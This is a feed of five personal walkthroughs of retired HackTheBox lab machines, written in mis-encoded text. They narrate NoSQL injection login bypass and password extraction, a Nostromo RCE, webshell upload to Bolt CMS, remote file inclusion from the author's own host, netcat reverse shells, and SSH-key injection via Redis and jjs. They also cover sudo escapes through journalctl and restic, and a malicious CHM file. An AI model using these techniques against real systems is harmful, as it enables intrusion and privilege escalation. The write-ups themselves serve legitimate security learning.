entry.title: HackTheBox - Mango
entry.content:
Quick Summary

‚Üí Another awesome machine ‚Äì "Mango" is a medium difficulty box that was vulnerable into NoSQL injection attack. I was stuck on the main page and the analytics page for an hour until i realize that was only a rabbit hole. There was a login page in staging-order.mango.htb that‚Äôs appeal on my NMAP scan. When I go to the forum I found out that the web apps use MongoDB when you try to search on google Mango db it‚Äôs a database program, classified as a NoSQL database program.
Using payload from PayloadAllTheThings i managed to bypass the login page‚Äô but when I get in i‚Äôll redirect at a Under Plantation page that was another rabbit hole, but it‚Äôs okay because I have now the idea that the machine is vulnerable to NoSQL Injection attack. With my python script i get the credentials for user mango & admin to get in to the machine via SSH and get the user.txt.
In the privilege escalation part there was a vulnerable software installed which is the jjs ‚Äì a java program command-line tool that is used to invoke the Nashorn engine. You can use it to interpret one or several script files, or to run an interactive shell.
I abuse the vulnerabilty by reading the root.txt and also inject my own SSH key and get in to the machine and got the administrator shell.

Penetration Testing Methodologies

  1. Network Scanning

    ‚Üí Nmap scan

    ‚Üí discover open ports and what services are running

  2. Enumeration

    ‚Üí Browsing the HTTP Service

    ‚Üí Exploring the Analytics page

    ‚Üí check the ssl certicate of the webapps

  3. Post - Exploitation

    ‚Üí Trying to bypass the Login page at staging-order.mango.htb

    ‚Üí with this payload from PayloadAllTheThings - NoSQL Injection Attack I managed to bypass the login

  4. Exploitation

    ‚Üí bruteforce the credentials of user ‚Äì mango & admin using python script

    ‚Üí After a minutes finally gets the both creds, Login with SSH Key and get the user.txt

  5. Privilege Escalation

    ‚Üí execute LinEnum.sh to look what we can do the machine

    ‚Üí look for what permission is allowed to user ‚Äì admin

    ‚Üí found the vulnerable software ‚Äì jjs

    ‚Üí with the help from GTFObins - jjs I can execute File read command to get root.txt

    ‚Üí I can also inject SSH keys with File write command

    ‚Üí Login with my generated SSH keys and become the administrator.

Network Scanning

Walkthrough

‚Üí I always begin at NMAP to look on the services what is running. I always use

  • -sV ‚áí Probe open ports to determine service/version info
  • -sC ‚áí equivalent to ‚Äîscript=default
  • -T 0-5 ‚áí Set timing template - higher is faster (less accurate)
  • -A- ‚áí Agressive scan
  • -oN ‚áí to save our scan results to a text file

Nmap results

So there‚Äôs port open.

  • 22 ‚áí which basically use for SSH Connections
  • 80 ‚áí which basically running a website
  • 443 ‚áí which holding SSL Certificate with "staging-order.mango.htb" I added it to my /etc/hosts file.

Enumeration

Mango Website

Normally i explore first the website‚Äô because that will give us interesting stuffs so :

The main page is looks like a google search right ? At first I didn‚Äôt realize that the main page is a hint for this machine i will tell it later.

Next i clicked on the analytics tabs :

This page is totally a rabbit hole‚Äô I can‚Äôt do anything about the website so I check the SSL Certifcate and it was registed at staging-order.mango.htb so I added it into my /etc/hosts file.

So after that I visited staging-order.mango.htb and it was a Login page.

Post - Exploitation

Bypass Login

I mention about that the main page is looks like a google search‚Äô I realized that was hint to give me idea what should I do for this phase. From the forum it‚Äôs a database, the name MANGO is a big hint, so I go to google and search about Mango DB and it give me a results MongoDB which use NoSQL
database program.

so I search about NoSQL Injection Attack and I found this then tried to login with some credentials and used Burp Suite to intercept the request, then modified the request body parameters base on the payload so :

I modified the username & password parameters by adding this [$ne] sending this it will return to HTTP/1.1 200 OK

Follow redirection and it will go to /home.php

Under Plantation

when I finally bypass the login it goes me to Under Plantation page :

As you can see at the page there was a user ‚Äì admin@mango.htb so I will keep it to my mind.
Now that I‚Äôm in I try to bruteforce the website under /home.php but bruteforcing is not really helpful until I found that this page is a rabbit hole again. but I have got a user admin and also already know that this was vulnerable to NoSQL Injection attack.

Exploitation

NoSQL Injection

I search about MongoDB - NoSQL Injection attack luckily i found this article it is about extracting admin password from the database using NoSQL Injections.

So then I made a python script that will automate the extraction of password similar to the article, this will need patience because password will reveal one by one so :

Get user shell

after almost 10 minutes I complete extracting the user mango password

Now login this with SSH I have now finally the initial shell.

I thought i can now get the user.txt until I remember there was another user that I see on the Under Plantation page the admin user. The next I did is to extract also the password using my python script, I just change only the line ‚Äì username:"mango" to username:"admin" and execute the script.

after 10 minutes the admin password is completed.

now with mango shell I just switch the user and finally get the user.txt :

Privilege Escalation

JJS Exploitation

For privilege escalation phase I will use LinEnum.sh to look for some stuffs that I will use to get the admin shell.

so from my Kali Linux machine, i transfer LinEnum to the target and execute.

As always it will show the basic information of the vulnerable machine.

Going deep of the recon I see interesting stuffs which is the JJS installed.

As you can see jjs is owned also by root, after the script is finish running. I also checked the other SUID :

Get the root.txt

I get a hint from the forum, the privilege escalation part is #GTFObins so I go the website and checked about JJS :

According to #GTFObins, we are able to spawn an interactive shell with elevated permissions, I used File read to catch root.txt at /root/ directory and yes ! I‚Äôm allowed to read that.

I also try the SUID when I execute it my session terminal shell is hang up but I get the administrator shell.

Administrator Shell

I am not satisfy what I did because I want to catch the admin shell and get again the root.txt I have only one options remaining the File write functions.

So my idea is to inject SSH key to /root/.ssh/ directory and login as root with my rsa keys so first i will generate my SSH Keys with commad 'ssh-key -t rsa' then copy the id_rsa.pub and echo it into a file in the /tmp directory so :

And now overwrite the root‚Äôs authorized_keys file :

Now that I setup all‚Äô I‚Äôll login as a root and finally have the last shell and also catch again the root.txt :

If you liked my writeup please leave a respect on my Profile

Referrences:

Extracting MongoDB password with NoSQL Injection

NoSQL Injection

Java gives a shell for everthing

#GTFObins - JJS

entry.title: HackTheBox - Traverxec
entry.content:
Quick Summary

‚Üí Traverxec is another beginner friendly machine that runs on Linux. The machine has two open ports which is port 22 & 80 that basically running a SSH and HTTP Service. There is nothing to use on the website when I tried to look something but the website‚Äôs has middleware service Nostromo 1.9.6 has a directory traversal bypass that causes RCE or Remote Code Execution and enter into www-data.
After entering the target machine it seems that user directory give us Permission's denied but when I was look at the configuration file we can enter at /public_www/ based on the $HOMEDIRS. The directory contains SSH Key which I use to enter for user david.
The Privilege Escalation part was tricky. As the user has can run journalctl that has root privileges and to get the root is to change the size of our terminal shell into small so I can execute !/bin/bash command and get the administrator shell.

Penetration Testing Methodologies

  1. Network Scanning

    ‚Üí Nmap scan

    ‚Üí discover open ports and what services are running

  2. Enumeration

    ‚Üí Browsing the HTTP Service

    ‚Üí Search about Nostromo 1.9.6

  3. Post - Exploitation

    ‚Üí Enumerate machine with Nostromo 1.9.6 Exploit

    ‚Üí Metasploit to gain direct access

    ‚Üí run LinEnum or Scripted Local Linux Enumeration & Privilege Escalation Checks to look for interesting inside the machine

    ‚Üí Decrypt the password hash that appear on the script.

    ‚Üí Looking at configuration file we allowed to enter /public_www/

  4. Exploitation

    ‚Üí copy the backup-ssh-key at the /tmp/ directory

    ‚Üí enumerate david files we see SSH Key

    ‚Üí decrypt SSH Key with ssh2john and decrypt the hash with John

    ‚Üí Login with SSH Key and use the passphrase we decrypt and get the user.txt

  5. Privilege Escalation

    ‚Üí Abuse what the user is allowed to run which is the journalctl

    ‚Üí with GTFObins I see that i can execute a shell with journalctl

    ‚Üí change the terminal into small size and execute !/bin/bash and become root

    ‚Üí Finally get the root.txt

Network Scanning

Walkthrough

‚Üí I always begin at NMAP to look on the services what is running. I always use

  • -sV ‚áí Probe open ports to determine service/version info
  • -sC ‚áí equivalent to ‚Äîscript=default
  • -T 0-5 ‚áí Set timing template - higher is faster (less accurate)
  • -A- ‚áí Agressive scan
  • -oN ‚áí to save our scan results to a text file

Nmap results

So there‚Äôs port open.

  • 22 ‚áí which basically use for SSH Connections
  • 80 ‚áí which basically running a website also there‚Äôs running a service which is Nostromo at version 1.9.6

Enumeration

Traverxec Website

Since there‚Äôs Web Service running, I will look at it and try what should I got so:

So we have a hint from the front page of the website. I got a user named ‚Äì David White i will take note this because there‚Äôs a possibly that guy we will be our user.

also the website‚Äôs a has a contact form but not much interesting.

other than there‚Äôs no more stuffs on the web‚Äô so I‚Äôll gonna move on the next phase.

In my nmap scan results‚Äô the HTTP Service has running Nostromo 1.9.6 i try to use searchsploit to look if there‚Äôs a vulnerability in that service and yes it has.

Nostromo 1.9.6

It was a directory traversal attack which is lead to Remote Command Execution. I try to look on the exploit with searchsploit again with -x

and the code exploit:

Post - Exploitation

Enumerate Traverxec machine

I search about the Nostromo 1.9.6 vulnerabilities, using the exploit that I have, i can execute a command like whoami and hostname so:

as you can see It give me results ‚Äì www-data. next I try the hostname:

and It gives me result hostname ‚Äì traverxec. Now since I can execute a command i‚Äôll try to use netcat if i can gain reverse shell, but it‚Äôs not working it gives me an error Cmd line: wrong

Use Metasploit to Direct Access

So I try Rapi7 - MetaSploit to direct access in the target machine and obtain remote shell, I search about Nostromo exploit and it is very exact what I needed so :

Now i will use it but first we need to see the options so I can see what is the requirements :

Get in into the machine

So RHOSTS or the target host which is the Traverxec and LHOST or the attackers IP (me) that I will input and do the exploitation.

so I have now direct access to machine. but I need to upgrade it into interactive shell with python :

Finally I have now the www-data :

WWW-DATA

Now that i‚Äôm in, the enumeration start again‚Äô to do this quickly I use LinEnum.sh this script is very useful if the attacker is trying to look what they need to do exploit exploit or use some stuffs for privilege escalation so from my Kali Linux machine I‚Äôll transfer LinEnum.sh in /tmp folder and run it.

And ofcourse running this it will give us a basic information about the target :

and there‚Äôs a previously login and that will be our user named ‚Äì david

I can also see what‚Äôs the user password in /etc/passwd based on david:x:1000:1000:david,,,:/home/david:/bin/bash :

but the script is doing that for me ;)

Now that I have a password hash for david I use john decrypt it with rockyou.txt wordlists. and I got the password Nowonly4me

I try to login into SSH with I password I got but it seems is not the right password. It just a rabbit hole. so moved on try to look again with other stuffs. so I‚Äôll go at home directory it doesn‚Äôt allow me to look into files.

So I‚Äôll try to look more on the machine folder‚Äô I go first at /var/ directory and I see a nostromo which is very interesting.

Looking at the nostromo folder there was a configuration file which is the nhttpd.conf and this will give me a big hint what to do next.

The nhttpd.conf has given instructions :

Exploitation

HOME DIRECTORY

based on the line $HOMEDIRS we can access /public_www at /home/david directory even it is given us permission‚Äôs denied so i go back to the david‚Äôs directory and enter to public_www folder

well there was a protected-file-area and I think it contains data hoping that this one is password but it is a backup-ssh-key not bad ! so :

Well since I dont have permission on that folder to do write I unzip and copy the .tgz file into /tmp directory so :

I see that there was ssh-key files which I can use to get in with user david.

Now what i need is to copy the id_rsa into my machine.

Decrypt SSH Key with ssh2john

I try to login in SSH with id_rsa I thought i can get in into machine but it needs a passphrase‚Äô to get that i decrypt id_rsa with ssh2john to get the hash.

Now that I have the hash it‚Äôs time to use John to decrypt and get the password.

Login with SSH and get user.txt

Looks good ! This enough I think, not it‚Äôs time to login with SSH with passphrase hunter.

Privilege Escalation

JOURNALCTL

This part was tricky the user david is allowed to run with sudo command with journalctl which has privilege unto root, but when I try to run sudo -l it requesting for a password I think that was not the right thing to do. so I search about the journalctl and luckily I found it on GTFObins

It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo. so I examined first the file server-stats.head this is a HEAD file which is (another file in the bin directory) and some information about the server.

The last line of server-stats.sh was very important. It runs sudo first, and then journalctl, which means journalctl is running with root privileges. Therefore, if we can control journalctl, we have root privileges. However, we cannot seem to change any parameters. When running anything sudo journalctl -n5 -unostromo.service other than that, a password will be required.

running the server-stats.sh

Get the ADMIN Shell

So this is the tricky part. I need to shrink my terminal size into small in order to execute !/bin/bash command and get the root.
first is I need to run /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service which has root privileges, it‚Äôs something like this.

before we execute it I will change my terminal size into small like this.

execute !/bin/bash command and finally I get the root shell and get the root.txt

after you go back the terminal size to normal it look like this.

get the root.txt

If you liked my writeup please leave a respect on my Profile

Referrences:

nostromo 1.9.6 - Remote Code Execution

Nostromo Directory Traversal Remote Command Execution

GTFObins

.. / journalctl

entry.title: HackTheBox - Registry
entry.content:
Quick Summary

‚Üí My very first Hard box is now retired. A machine where you can exploit if you know what the technology is used. The initial scan has give me a big hint that this machine is using Docker and 3rd party server named REGISTRY Server.
And in the server there‚Äôs a lot container which I downloaded and find an SSH Key to get in to the machine and get the user.txt.
On my Privilege Escalation to the box‚Äô I found out that I need to do lateral movement to the www-data shell which basically the webserver. From that, user can abuse SUDOERS rights by running the Restic and create a backup for root directory to my Kali Linux machine and get the shell and root.txt.

Penetration Testing Methodologies

  1. Network Scanning

    ‚Üí Nmap scan

    ‚Üí discover open ports and what services are running

  2. Enumeration

    ‚Üí Browsing the HTTP Service

    ‚Üí put the commonName in /etc/hosts/ file that appear on the Nmap Scan

    ‚Üí Download and analyze the install file

    ‚Üí Visit the docker.registry.htb and Look for interesting stuff in a Docker API

  3. Post - Exploitation

    ‚Üí Enumerating the Docker API by following this method

    ‚Üí Found the docker repository that contains image called bolt-image

    ‚Üí Found the some blobs file from latest

    ‚Üí Download all the blob files and try to look for a password or ssh key

    ‚Üí Get in to the Registry machine

  4. Exploitation

    ‚Üí Enumerate the Bolt CMS Website

    ‚Üí using LinPEAS i found a hash that I can use for password of the website

    ‚Üí Looking at configuration I modify the config.yml and upload 2 webshells as fast as I can to gain www-data shell.

  5. Privilege Escalation

    ‚Üí Abuse what www-data allowed to run which is the restic

    ‚Üí create snapshot on my Kali linux machine which will be the backup server for restic

    ‚Üí do reverse SSH in bolt user shell

    ‚Üí run the restic on www-data and backup the root directory that will transfer into my machine.

    ‚Üí get the id_rsa key on ssh folder, and login as root.

    ‚Üí Finally rooted and got the root.txt

Network Scanning

Walkthrough

‚Üí First, I run the NMAP to scan the target and get information about the various services that are running on the target machine. I use

  • -sV ‚áí Probe open ports to determine service/version info
  • -sC ‚áí equivalent to ‚Äîscript=default
  • -T 0-5 ‚áí Set timing template - higher is faster (less accurate)
  • -p- ‚áí Scan all 65535 ports
  • -oN ‚áí to save our scan results to a text file

Nmap results

So there‚Äôs port open.

  • 22 ‚áí which basically use for SSH Connections
  • 80 ‚áí which basically running HTTP Service
  • 443 ‚áí which running also HTTP/S and have ssl-cert ‚Äì commonName=docker.registry.htb, I added that on my hosts file.

Enumeration

So I always visit first the HTTP service because that is a website and I got default page of a Nginx Server.

There‚Äôs no hint for that so i try enumerate the website using dirsearch Web path scanner to look for website page or items which can give me a hints.

Bruteforce Web directories

Get install file

I only got one which is the install when I added it into the URL it is 404 Page Not found.

but I manage to download the install using wget

So I thought this was only ordinary a text file but it‚Äôs not, is a gzip file so I tried to move into a gzip and decompressed but it‚Äôs not working, and I don‚Äôt whats wrong so I move on and go the the next phase.

Explore Docker Registry

Next, i visited the docker.registry.htb and there will be a popup login requesting for username and password, I input admin:admin on that and it‚Äôs displaying a JSON API page.

and the JSON API

Post - Exploitation

Next, I search for Docker api registry exploitation and I didn‚Äôt failed. I found this awesome article which help me to get a password for SSH Key by exploring each blobs file.

So based on the method of the article, I look first at the /v2/_catalog and there‚Äôs a docker repository called "bolt-image" and it is basically a collection of related images.

Diving the Docker Repository

Next I added /tags/list and there was repository install called latest

trying to look at the /manifest/v2

To download the file latest I added simply this in the url /manifest/latest.

Open this file and we will see a lot of blobSum does have the latest repository in a Docker registry. Each of them will contains some info like password, files, ssh key etc.

Here are some blobs from latest.

Exploring the blobSums

So I need to explore each blobSum, i will download each using wget and look for interesting stuffs. so:

Then i will moved it to into .gz file and decompressed it.

Finally i can now read whats is on the first blob.

Base on the first blob i download it looks like the "GkOcz221Ftb3ugog" is a password for SSH Key but I don‚Äôt have the id_rsa which is needed as from this line.

Hunting the Private key

So i need more blobSum to get the id_rsa key, the 2nd blob was empty. and thid blob looks interesting this one is 100 mb total of files so:

Get in into the REGISTRY

after the download finished I explore the /root directory which contains the .ssh directory which has id_rsa and config file.

I look first at the config file and the user for SSH is bolt

and the RSA Key

I move the the id_rsa in my registry directory and do the SSH Login so:

and Finally i can now get the user.txt

Exploitation

So it‚Äôs time to do enumeration again the bolt user shell, I tried LinPEAS to enumerate the shell, then I found out that there was a CMS installed in the machine which is "Bolt CMS"

wget, curl was not working, so I try netcat to transfer the linpeash.sh

Registry Basic Information

BOLT CMS WEBSITE

Going deep of recon I see db.sqlite which contains a password hash, and installed CMS Website at /var/www/html directory.

I visited the bolt website at registry.htb/bolt

Then I decrypt the password hasha using John The Ripper so:

after only 9 seconds i get the password strawberry and login this into Bolt CMS

BOLT CMS LOGIN PAGE

After login it display the dashboard which has a lot of stuffs.

BOLT CMS DASHBOARD PAGE

I search on the bolt cms exploit and I found this article it is the same version on the bolt cms installed on the registry machine.

I tried to follow the exploitation but it doesn‚Äôt work. Also this part was really hard because theres a cron job inside that will erase everything you modified to I need to be fast as much.

So this is the default Config.yml in Bolt CMS Configuration where you can edit accept_file_types.

In the configuration file i‚Äôll put php, and py extensions so I can upload my webshells. Why I need to upload 2 different file ? PHP Reverse Shell is not working so I search for other webshell that I can execute and get remote inside on the webserver.

Until i found out that I can use Bind Shell go gain remote shell. So I created my simple bind shell with python. this is similar to this one

save it ! then I used p0wnyShell so I can run the bind shell (shell.py) and connect it with my Kali Linux so. after done setting up I‚Äô uploaded it into File Management inside the Bolt CMS.

now I will open the p0wnyshell and run the shell.py

You will see that the port is in already in use but it‚Äôs okay I can still connect with my Kali Linux, and Now I‚Äôm on the shell of www-data

Privilege Escalation

As a www-data user we can restic sudo

So as we have privilege for running the restic we can get the root.

RESTIC BACKUP PROGRAM

So what is Restic ?
Restic is a backup program that is fast, efficient and secure. It supports the three major operating systems (Linux, macOS, Windows) and a few smaller ones (FreeBSD, OpenBSD).

Since we have privilege by running restic we can backup the root directory and get the administrator shell.

First I install restic into may Kali Linux.

after the installation, I will create backup folder and set a password on that.

Looking at the backups directories

SETTING UP THE SERVER

Now I will install docker to my machine and start a server at port 8000

Now i will run restic server on my machine and set the path at /backups so:

after it‚Äôs successfully start the server we will go back the the bolt user shell and set reverse SSH so:

CREATING BACKUPS

Looks good ! Now I can create backups in www-data, I will choose to backup /root/ folder because this what I need to ge the administrator so:

Now it‚Äôs successfully saved on snapshot, back into my machine I will restore the backup I created.

Success ! Now it will create /restore folder which contains all the files we need, from there I can get the root.txt

isn‚Äôt enough we need the administrator shell, i will use the id_rsa inside the .ssh so:

GET THE ADMIN SHELL

If you liked my writeup please leave a respect on my Profile

Referrences:

Anatomy of a hack: Docker Registry

Docker Registry

Exploiting Docker Registry

p0wnyshell

Bind Shell

entry.title: HackTheBox - Sniper
entry.content:
Quick Summary

‚Üí Sniper is another windows machine that you can access in unintended method.
The PHP Web Application was supposed to be vulnerable into LFI or Local File Inclusion to RFI or Remote File Inclusion.
Since this is a windows box I setup a samba share using the RFI method and I injecting my webshell and upload my executable file to get a reverse shell from my Kali Linux machine.
Doing some Reconnaisance I see a file which has to be related to user credentials that need to convert into a plain text then execute it with the executable file i uploaded.
The machine creator was leave a notes.txt on use file directory which is good enough as hint. Creating a malicious payload from my host using Powershell was not easy as my Windows always reject it and cannot load the script file but then I managed to create a malicious CHM file and get the Administrator.

Penetration Testing Methodologies

  1. Network Scanning

    ‚Üí Nmap scan

    ‚Üí discover open ports and what services are running

  2. Enumeration

    ‚Üí Browsing the HTTP Service

    ‚Üí Enumerate the SMB at port 445

    ‚Üí Bruteforce the Web page directories

  3. Post - Exploitation

    ‚Üí Enumerate the page with Local File Inclusion

    ‚Üí Setup SAMBA SHARE and upload a webshell

    ‚Üí Using the access checked provided by the Microsoft to check the access rights of account "Chris"

    ‚Üí Retrieve user credentials from Web page directories in inetpub

  4. Exploitation

    ‚Üí Method #1:
    Look at listening port that can use to Port Forwarding and Login as Chris using Evil-WinRM

    ‚Üí Method #2:
    Convert the password hash into plaintext with Powershell and execute the nc.exe to get Reverse shell

    ‚Üí Finally got the user.txt

  5. Privilege Escalation

    ‚Üí Enumerate file directories

    ‚Üí Looking at notes.txt that give us hint.

    ‚Üí Create a malicious file in Powershell with Out-CHM.ps1 from Nishang

    ‚Üí Transfer to the Sniper machine in C:\Docs directories where the Administrator checked and open it.

    ‚Üí Setup netcat listener and

    ‚Üí Gain the Administrator shell

Network Scanning

Walkthrough

‚Üí First, I run the NMAP to scan the target and get information about the various services that are running on the target machine. I use

  • -sV ‚áí Probe open ports to determine service/version info
  • -sC ‚áí equivalent to ‚Äîscript=default
  • -T 0-5 ‚áí Set timing template - higher is faster (less accurate)
  • -p- ‚áí Scan all 65535 ports
  • -oN ‚áí to save our scan results to a text file

Nmap results

So there‚Äôs port open.

  • 80 ‚áí which basically hosted a Web page
  • 135 ‚áí running as Windows RPC
  • 139 ‚áí running on Windows Microsoft netbios-ssn
  • 445 ‚áí which is a default port on SMB
  • 49667 ‚áí running as Windows RPC too

Enumeration

The first thing I did is connect to machine with smbclient at port 445 and try anonymous login but it seems‚Äô I am not allowed to do that.

Next, I use enum4linux ‚Äì A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts but not working too.

Scan Web page directories

So I will leave enumerating this machine for a while and try to enumerate what‚Äôs on the Web page. I use dirsearch Web path scanner if i can get any usefull stuffs so

Sniper Web Page

so there is login page which caught my attention at /user/login.php

I tried to input admin:admin for username and password and it redirects me into Under Construction Page.

I realized that this page is just a rabbit hole, can‚Äôt find any hints in the page source, so I try enumerate the whole page of sniper in http://10.10.10.151

Post - Exploitation

LFI | Local File Inclusion

After several enumeration in the web page‚Äô I found interesting section at Services there‚Äôs a link there that you can use to change the language but what more interesting, it‚Äôs not like the other website that you can right click -> and change/translate the language. there‚Äôs a PHP File is assign to pick language for you.

when I try to inject a single ' in lang=blog-en.php it turn something like this‚Äô seems to be it is vulnerable to LFI or Local File Inclusion attack

To confirm that this website is vulnerable to LFI I put this parameter at "lang=" ‚áí \windows\system32\drivers\etc\hosts

looking at at view page source we will see about the hosts file.

RFI | Remote File Inclusion

So I search on Google about LFI to RFI article and that one is pretty good. It help me to inject a webshell and get in to the machine.

I setup my SAMBA SHARE based on the article with this configuration at /etc/samba/smb.conf

Now everything looks fine i restart my samba share and do the RFI method.
To take control the web I use Winter WebShell so I can upload my payload and execute a revershell, so i will now put my IP address at lang=\\10.10.14.216\medz\shell.php then make a custom directory at C:

Create folder named ‚Äì payas0

Looks good ! then i will upload nc.exe at C:\payas0

Now everything is set i will execute nc.exe with my IP and Port at 9001 and popup Powershell

after executing this I have an initial shell ;)

Enumerating SNIPER machine

I start another enumeration, so first thing I did is to look who‚Äôs user inside with powershell command Get-WmiObject -Class Win32_UserAccount so:

So I‚Äôve got USER named ‚Äì Chris and I try to checked the access right of that account with Access checked so

Second I visit the inetpub directory where the website is installed and the source code. and I‚Äôm lucky i see interesting file at C:\inetpub\wwwroot\user\db.php which contain user credentials.

The DB connection String was found at the db.php was confirmed that the creds is owned by user Chris

Exploitation

Privilege Escalation for user CHRIS

Method #1

I was thinking if I can use that creds in Evil-WinRM protocol (netstat -ano) and get the user.txt

We can use port 5985 to create the Port Forwarding method and login as Chris but before i do that I uploaded plink.exe windows binary to Sniper and create a tunnel so I can access that port from my machine so:

Now that the tunnel is created, I will try to login as user Chris using dbuser password and get the user.txt

Method #2

Yes there‚Äôs a method #2 to get user.txt and this is less hassle than doing port forwarding with powershell but first I will give permission my payas0 folder then setup netcat listener in my Kali nc -lnvp 4444 so:

then do script.

After executing the last command I have now again the shell (2nd shell) and this was look better.

Privilege Escalation

Enumeration begins again‚Äô but this was pretty easy as the the stuffs I needed is all in the basic folder directories.
Going at C:\Docs directory there‚Äôs a note.txt leave by our ‚ÄúBoss‚Äù says.

Note.txt

What‚Äôs on the note.txt ? Well this:

So hints is on the note ‚áí "The documentaion for the new app, then I will drop it here when I'm done with it." So there‚Äôs a file here here which the Administrator will checked and open it.

CHM File

Next, in the C:\Users\Chris\Downloads directory there‚Äôs a CHM file.

Generate Malicious CHM File

To view the chm file, you need to open it with Windows, so I transferred the chm file to my Windows machine, and it is
precisely the documentation for the app, requested by the Sniper CEO:

Administrator will checked CHM and open it then the payload will triggered.

This one is new to me I have never had anything to do with CHM files‚Äô so I did some research about CHM File and I found that you can create a malicious CHM File with Nishang and use the Out-CHM.ps1.

I try to download first the Out-CHM.ps1 in my Windows but it rejected because it is considered as a virus‚Äô. Well creating a malicious CHM File was fuck me‚Äô as my Windows always deny it even i disable my windows security for a while, Powershell will always reject it.

but I managed it too using powershell -ep bypass

Now before generate a CHM file we need to download this first HTML Help Workshop from Microsoft and choose htmlhelp.exe (run/install it). This will create the folder C:\Program Files (x86)\HTML Help
Workshop with the needed programs to create the malicious .chm file.

and Finally, I can now create CHM file.

Gain the Administrator Shell

So it‚Äôs done ! Now I will upload doc.chm in C:\Docs directory of SNIPER machine.

Once we put the doc.chm file in Docs I simply setup netcat listener with my port i generated in malicious chm file. Now all i need to do is to wait the Administrator to checked and open it.

Root

After 2-3 minutes I have the administrator shell ! Very nice box !

Get the root.txt

If you liked my writeup please leave a respect on my Profile

Referrences:

LFI to RFI

WebShell for Windows

Access Privilege Checked

HTML Workshop

Nishang - Out-CHM

entry.title: HackTheBox - Postman
entry.content:
Quick Summary

‚Üí This easy machine is very fit to all beginners to learn the basic of Penetration Testing. The machine have a vulnerable software ‚Äì Redis.
Redis is unprotected without a password set up, and so forth. The simplest thing you can do in such a case, is to write random file such as SSH keys which i‚Äôll use to get in into the machine. After getting the shell, there‚Äôs SSH key for user Matt. The machine is very straightforward to the root after you get the credentials of the user and use it for another vulnerability ‚Äì CVE Webmin 1.910.

Penetration Testing Methodologies

  1. Network Scanning

    ‚Üí Nmap scan

    ‚Üí discover open ports and what services are running

  2. Enumeration

    ‚Üí Browsing the HTTP Service on different ports

    ‚Üí Bruteforce the Web page directories

    ‚Üí Check the software vulnerabilities

  3. Post - Exploitation

    ‚Üí Check if we can inject or put some file inside in the Redis

    ‚Üí The goal is to transfer SSH keys

    ‚Üí Get in into redis shell

  4. Exploitation

    ‚Üí Find some interesting things using LinEnum.sh that can use for Exploitation

    ‚Üí Get the backup SSH key of a user

    ‚Üí Use the credentials for CVE Webmin 1.910

    ‚Üí Get the root shell

Network Scanning

Walkthrough

‚Üí First, I run the Nmap to scan the target and get information about the various services that are running on the target machine. I use

  • -sV ‚áí Probe open ports to determine service/version info
  • -sC ‚áí equivalent to ‚Äîscript=default
  • -T 0-5 ‚áí Set timing template - higher is faster (less accurate)
  • -p- ‚áí Scan all 65535 ports
  • -oN ‚áí to save our scan results to a text file

Nmap results

So there‚Äôs port open.

  • 22 ‚áí running on OpenSSH 7.6p1
  • 80 ‚áí running on Apache/2.24.49
  • 6379 ‚áí running on Redis key-value version 4.0.9
  • 10000 ‚áí running on MiniServ 1.910 (Webmin httpd)

Enumeration

I visited the web page in port 80 and there‚Äôs nothing interesting stuffs here except the Postman@htb so added it into my /etc/hosts/

Scan the Web directories

So, since I don‚Äôt have any clue what is on the Web page, I use dirsearch Web path scanner to find some stuffs with the following command.

So I have this following directories, everything is a normal web directories except on the /upload/ directory which caught my attention.

Going to the /upload/ directory we will see a lot of image there. I tried to look fo the interesting image‚Äô but I realize that this one is a rabbit hole so moved on and go the next phase.

Upload page

Webmin 1.910

Next is to visit the Port 10000 which holding an HTTP service ‚Äì Miniserv 1.910 (Webmin httpd)

I search the webmin version that runs on the machine to look if there‚Äôs an existing exploit and there is.

Webmin Package Updates Remote Code Execution.

‚Üí Description: This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the ‚ÄúPackage Updates‚Äù module can execute arbitrary commands with root privileges.

Since I don‚Äôt have any credentials that will use on that exploits, i will leave this for a while and moved on to the next phase of hunting.

Post Exploitation

Next is to try Redis that appear on my nmap scan.
‚Üí Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker.

I used the redis-tools package to communicate to the service of Redis. The existing vulnerability in version 4.0.9, you can interact redis without username and password.

So, to start let‚Äôs check if I can access the instance, which is a prerequisite:

Communicate with telnet

Works, Redis it is unprotected without a password set up.

Next is to try the redis-cli to look if i‚Äôll got something.

By using get s-key command inside redis it shows that there‚Äôs an existing ssh key that use for authentication. As a redis user shell I can write something in the database to a file with SAVE command. So I was thinking if I can put mine to get in.

Inject SSH Keys

Since the Redis is not protected. I will try to write something into ~/.ssh/authorized_keys in order to gain access to shell. So i will generate my SSH Key first and save into my postman directory.

OPENSSH Key will not valid. To get this work I‚Äôll need RSA PRIVATE Key using this line I can push my ssh-key into private key.

Generated SSH Key

Now I‚Äôve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one.

So‚Äô by following this method I will now put my generated ssh-key.

Now Let‚Äôs now put my SSH Key into the Redis.
Using redis-cli I can check, set a directory for redis and save.

I‚Äôve successfully save my SSH key. Now I‚Äôll try to login with ssh.

It works! I‚Äôve got now the initial shell.

Exploitation

Recon

By doing some Recon i‚Äôll use LinEnum.sh ‚Äì Scripted Local Linux Enumeration & Privilege Escalation Checks.
It will help to find weaknesses and save my time to do the Privilege Escalation, I‚Äôll uploaded it into /tmp/ directories of redis and execute it, so:

At first it will show the system information of Postman machine.

Shell user

I see the user Matt and also my shell user as Redis.

Backup private SSH Key

Going deep of recon, there‚Äôs a file that caught my attention. Is a backup SSH key of some user. Base on the info that show‚Äô it is owned by user Matt

Going to the /opt/ directory, I‚Äôll try to transfer id_rsa.bak into my machine but it seems not working, so I used cat to view the content of the file.

Cracking the HASH

I copy the content of id_rsa.bak into my machine and I use ssh2john to convert and crack it with John The Ripper

Cracking this using John The Ripper.

Just only 14 seconds. I‚Äôve got now the password of Matt

Login as Matt

I may now able to login as Matt and get the user.txt

CVE Webmin 1.910

In the early stage of my Penetration Testing to this machine‚Äô there‚Äôs an existing vulnerability ‚Äì CVE Webmin 1.910 that need credentials. I‚Äôll use metasploit to do the exploitation and pick the webmin_packageup_rce

I will use the credentails for Matt and let‚Äôs see what will happen ;)

base on the options it requires ‚Äì PASSWORD, RPORT is on default 10000, RHOSTS which is the victim IP (Postman), SSL (will set to true), and USERNAME so:

It works! And to upgrade my shell i use import pty using python:

Root

Very straightforward ‚Äì Rooted! Now i can get the root.txt

If you liked my writeup please leave a respect on my Profile

Referrences:

